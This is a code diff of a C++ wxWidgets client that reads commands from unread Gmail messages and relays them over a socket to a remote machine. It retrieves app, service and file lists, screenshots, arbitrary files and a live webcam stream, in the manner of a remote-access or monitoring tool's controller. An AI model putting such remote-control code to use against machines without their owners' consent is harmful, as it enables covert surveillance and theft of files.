@@ -1,110 +1,12 @@
-// Client.cpp
+// client.cpp
 #include "client.h"
 
-// Client::Client(const std::string &ip_address, int port)
-//     : ip_address_(ip_address), port_(port), client_socket_(INVALID_SOCKET) {}
-//
-// void Client::loadAccessToken()
-//{
-//     std::ifstream token_file("access_token.txt");
-//     if (token_file.is_open())
-//     {
-//         std::getline(token_file, access_token_);
-//         token_file.close();
-//     }
-//     else
-//     {
-//         std::cerr << "Unable to open access token file." << std::endl;
-//     }
-// }
-//
-// void Client::checkForMessages()
-//{
-//     const int interval_seconds = 3; // Polling interval
-//     while (true)
-//     {
-//         system("cls");
-//
-//         // Check for ESC key to exit
-//         if (_kbhit())
-//         {
-//             char key = _getch();
-//             if (key == 27)
-//             { // ESC key
-//                 std::cout << "ESC key pressed. Exiting..." << std::endl;
-//                 break;
-//             }
-//         }
-//
-//         std::cout << "Checking for new messages..." << std::endl;
-//
-//         std::vector<std::string> tasks = GmailClient::getUnreadMessageContents(access_token_);
-//         for (const std::string &messageContent : tasks)
-//         {
-//             if (Socket::sendString(client_socket_, messageContent))
-//             {
-//                 std::cout << "Sent successfully!\n";
-//                 if (messageContent.substr(0, 8) == "list app")
-//                 {
-//                     Socket::receiveFile(client_socket_, L"apps_list.txt");
-//                 }
-//                 else if (messageContent.substr(0, 12) == "list service")
-//                 {
-//                     Socket::receiveFile(client_socket_, L"services_list.txt");
-//                 }
-//                 else if (messageContent.substr(0, 15) == "take screenshot")
-//                 {
-//                     Socket::receiveFile(client_socket_, L"screenshot.jpeg");
-//                 }
-//             }
-//         }
-//
-//         std::this_thread::sleep_for(std::chrono::seconds(interval_seconds));
-//     }
-// }
-//
-// void Client::cleanup()
-//{
-//     if (client_socket_ != INVALID_SOCKET)
-//     {
-//         Socket::cleanup(client_socket_);
-//     }
-// }
-//
-// void Client::run()
-// {
-//     if (!Socket::initialize())
-//     {
-//         return;
-//     }
-
-//     client_socket_ = Socket::createClient();
-//     if (client_socket_ == INVALID_SOCKET)
-//     {
-//         WSACleanup();
-//         return;
-//     }
-
-//     if (Socket::connectToServer(client_socket_, ip_address_.c_str(), port_))
-//     {
-//         loadAccessToken();
-//         checkForMessages();
-//     }
-
-//     cleanup();
-// }
-
-Client::Client(std::string &ip_address, int port, wxStaticText *m_statusText)
-    : ip_address_(ip_address), port_(port), client_socket_(INVALID_SOCKET)
+Client::Client(const std::string &ip_address, int port, wxStaticText *m_statusText)
+    : ip_address_(ip_address), port_(port), server_socket_(INVALID_SOCKET)
 {
     m_checkMessageTimer = new wxTimer(this);
-    // Bind(wxEVT_TIMER, &Client::checkForMessages, this);
-    Bind(wxEVT_TIMER, [this, &m_statusText](wxTimerEvent &)
+    Bind(wxEVT_TIMER, [this, m_statusText](wxTimerEvent &)
          { checkForMessages(m_statusText); });
-
-    // ButtonConfirm->Bind(wxEVT_BUTTON, [this, desPanel1, desPanel2, &ip_address, &port, &target_email, m_statusText, &client](wxCommandEvent&) {
-    //     OnButtonClicked(desPanel1, desPanel2, ip_address, port, target_email, m_statusText, client);
-    //     });
 }
 
 void Client::loadAccessToken()
@@ -127,75 +29,78 @@ void Client::checkForMessages(wxStaticText *m_statusText)
     while (true)
     {
         updateStatus("Checking for new messages...", m_statusText);
-        std::vector<std::string> tasks = GmailClient::getUnreadMessageContents(access_token_);
+
+        std::vector<std::string> tasks;
+        try
+        {
+            tasks = GmailReceiver::getUnreadMessageContents(access_token_);
+        }
+        catch (const std::exception &e)
+        {
+            // std::cerr << "Error retrieving messages: " << e.what() << std::endl;
+            updateStatus("Error retrieving messages", m_statusText);
+            break;
+        }
+
+        // if (tasks.empty())
+        // {
+        //     std::cout << "No new messages found." << std::endl;
+        // }
+
         bool stop = false;
         for (const std::string &messageContent : tasks)
         {
             stop = processMessage(messageContent, m_statusText);
+            if (stop)
+            {
+                break;
+            }
         }
+
         if (stop)
         {
             break;
         }
-        updateStatus("Waiting for messages...", m_statusText);
 
+        updateStatus("Waiting for messages...", m_statusText);
         std::this_thread::sleep_for(std::chrono::seconds(interval_seconds));
     }
-    // try
-    // {
-    //     const int interval_seconds = 3; // Polling interval
-    //     while (true)
-    //     {
-    //         updateStatus("Checking for new messages...", m_statusText);
-    //         std::vector<std::string> tasks = GmailClient::getUnreadMessageContents(access_token_);
-
-    //         for (const std::string &messageContent : tasks)
-    //         {
-    //             processMessage(messageContent, m_statusText);
-    //         }
-
-    //         updateStatus("Waiting for messages...", m_statusText);
-
-    //         std::this_thread::sleep_for(std::chrono::seconds(interval_seconds));
-    //     }
-    // }
-    // catch (const std::exception &e)
-    // {
-    //     updateStatus(wxString::Format("Error: %s", e.what()), m_statusText);
-    // }
 }
 
 bool Client::initialize(wxStaticText *m_statusText)
 {
-    if (!Socket::initialize())
+    if (!initializeSocket())
     {
         updateStatus("Socket initialization failed", m_statusText);
         return false;
     }
 
-    client_socket_ = Socket::createClient();
-    if (client_socket_ == INVALID_SOCKET)
+    server_socket_ = createClientSocket();
+    if (server_socket_ == INVALID_SOCKET)
     {
         updateStatus("Client socket creation failed", m_statusText);
         WSACleanup();
         return false;
     }
-
-    if (Socket::connectToServer(client_socket_, ip_address_.c_str(), port_))
+    if (connectToServer(ip_address_.c_str(), port_))
     {
         loadAccessToken();
         checkForMessages(m_statusText);
     }
+    else
+    {
+        updateStatus("Server connection failed", m_statusText);
+        return false;
+    }
 
-    updateStatus("Server connection failed", m_statusText);
-    return false;
+    return true;
 }
 
 void Client::cleanup()
 {
-    if (client_socket_ != INVALID_SOCKET)
+    if (server_socket_ != INVALID_SOCKET)
     {
-        Socket::cleanup(client_socket_);
+        cleanupSocket();
     }
 }
 
@@ -224,47 +129,49 @@ bool Client::processMessage(const std::string &messageContent, wxStaticText *m_s
 {
     updateStatus(wxString::Format("Processing: %s", messageContent), m_statusText);
 
-    if (Socket::sendString(client_socket_, messageContent))
+    if (sendString(messageContent))
     {
         std::cout << "Sent successfully!\n";
         if (messageContent.substr(0, 8) == "list app")
         {
-            Socket::receiveFile(client_socket_, L"apps_list.txt");
+            receiveFile(L"apps_list.txt");
         }
         else if (messageContent.substr(0, 12) == "list service")
         {
-            Socket::receiveFile(client_socket_, L"services_list.txt");
+            receiveFile(L"services_list.txt");
         }
         else if (messageContent.substr(0, 15) == "take screenshot")
         {
-            Socket::receiveFile(client_socket_, L"screenshot.jpeg");
+            receiveFile(L"screenshot.jpeg");
         }
         else if (messageContent.substr(0, 10) == "list files")
         {
-            Socket::receiveFile(client_socket_, L"files_list.txt");
+            receiveFile(L"files_list.txt");
         }
         else if (messageContent.substr(0, 3) == "get")
         {
-            // std::wstring file_name = std::wstring(messageContent.begin() + 4, messageContent.end());
-            Socket::receiveFile(client_socket_, L"get_file");
+            receiveFile(L"get_file");
         }
         else if (messageContent.substr(0, 9) == "start cam")
         {
             while (true)
             {
-                cv::Mat frame = Socket::receiveFrame(client_socket_); // Receive frame
+                cv::Mat frame = receiveFrame(); // Receive frame
                 if (frame.empty())
                 {
                     std::cerr << "Failed to receive frame." << std::endl;
                     break;
                 }
 
+                std::cout << "Received frame of size: " << frame.size() << " and type: " << frame.type() << std::endl;
+
                 cv::imshow("Client - Webcam Stream", frame);
-                if (cv::waitKey(1) == 27)
+                int key = cv::waitKey(1);
+                if (key == 27)
                 { // ESC to exit
                     // Send stop message to server
                     std::string stopMessage = "stop";
-                    send(client_socket_, stopMessage.c_str(), stopMessage.size(), 0);
+                    send(server_socket_, stopMessage.c_str(), stopMessage.size(), 0);
                     break;
                 }
             }
@@ -278,4 +185,109 @@ bool Client::processMessage(const std::string &messageContent, wxStaticText *m_s
         }
     }
     return false;
+}
+
+// Socket-related methods
+bool Client::initializeSocket()
+{
+    WSADATA wsaData;
+    return WSAStartup(MAKEWORD(2, 2), &wsaData) == 0;
+}
+
+SOCKET Client::createClientSocket()
+{
+    return socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+}
+
+bool Client::connectToServer(const char *ipAddress, int port)
+{
+    sockaddr_in serverAddress;
+    serverAddress.sin_family = AF_INET;
+    serverAddress.sin_addr.s_addr = inet_addr(ipAddress);
+    serverAddress.sin_port = htons(port);
+
+    return connect(server_socket_, (sockaddr *)&serverAddress, sizeof(serverAddress)) == 0;
+}
+
+bool Client::receiveFile(const std::wstring &savePath)
+{
+    std::ofstream outputFile(savePath, std::ios::binary);
+    if (!outputFile.is_open())
+    {
+        std::cerr << "Failed to open file for writing: " << savePath << std::endl;
+        return false;
+    }
+
+    char buffer[MAX_PACKET_SIZE];
+    int bytesRead;
+    while ((bytesRead = recv(server_socket_, buffer, MAX_PACKET_SIZE, 0)) > 0)
+    {
+        outputFile.write(buffer, bytesRead);
+    }
+
+    outputFile.close();
+    return bytesRead == 0;
+}
+
+void Client::cleanupSocket()
+{
+    closesocket(server_socket_);
+    WSACleanup();
+}
+
+bool Client::sendString(const std::string &message)
+{
+    return send(server_socket_, message.c_str(), message.size(), 0) != SOCKET_ERROR;
+}
+
+cv::Mat Client::receiveFrame()
+{
+    int frameSizeNetworkOrder = 0;
+    int result = recv(server_socket_, (char *)&frameSizeNetworkOrder, sizeof(frameSizeNetworkOrder), 0);
+    if (result == SOCKET_ERROR || result == 0)
+    {
+        std::cerr << "Failed to receive frame size: " << WSAGetLastError() << std::endl;
+        return cv::Mat();
+    }
+
+    int frameSize = ntohl(frameSizeNetworkOrder); // Convert from network byte order
+
+    std::vector<uchar> buffer(frameSize);
+    int receivedBytes = 0;
+
+    while (receivedBytes < frameSize)
+    {
+        int chunkSize = ((MAX_PACKET_SIZE < (frameSize - receivedBytes)) ? MAX_PACKET_SIZE : (frameSize - receivedBytes));
+        int bytesReceived = recv(server_socket_, (char *)buffer.data() + receivedBytes, chunkSize, 0);
+        if (bytesReceived == SOCKET_ERROR)
+        {
+            std::cerr << "Receive failed: " << WSAGetLastError() << std::endl;
+            return cv::Mat();
+        }
+        if (bytesReceived == 0)
+        {
+            std::cerr << "Connection closed by the server." << std::endl;
+            return cv::Mat();
+        }
+        receivedBytes += bytesReceived;
+    }
+
+    // Log buffer content for debugging
+    std::cout << "Received frame size: " << frameSize << std::endl;
+    std::cout << "Received bytes: " << receivedBytes << std::endl;
+
+    // Check if the buffer is filled correctly
+    if (receivedBytes != frameSize)
+    {
+        std::cerr << "Received bytes do not match frame size." << std::endl;
+        return cv::Mat();
+    }
+
+    cv::Mat frame = cv::imdecode(buffer, cv::IMREAD_COLOR);
+    if (frame.empty())
+    {
+        std::cerr << "Failed to decode frame." << std::endl;
+    }
+
+    return frame;
 }
